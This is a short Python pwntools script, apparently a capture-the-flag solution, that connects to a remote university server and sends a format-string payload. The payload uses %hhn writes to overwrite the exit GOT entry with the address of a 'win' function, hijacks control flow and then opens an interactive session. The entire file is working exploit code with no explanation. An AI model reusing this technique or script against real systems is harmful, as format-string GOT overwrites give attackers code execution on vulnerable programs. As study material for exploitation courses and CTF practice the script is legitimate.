from pwn import *

s = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 22197)

exit_gop = 0x0804a018
#win     = 0x0804849b 

payload =  p32(exit_gop+2) + b'%007$hhn'                        
payload += p32(exit_gop+3) + b'%010$hhn'                   
payload += p32(exit_gop+1) + b'%000120c' + b'%013$hhn'     
payload += p32(exit_gop+0) + b'%000019c' + b'%018$hhn'     

s.sendline(payload)
print(s.recvline())

s.interactive()
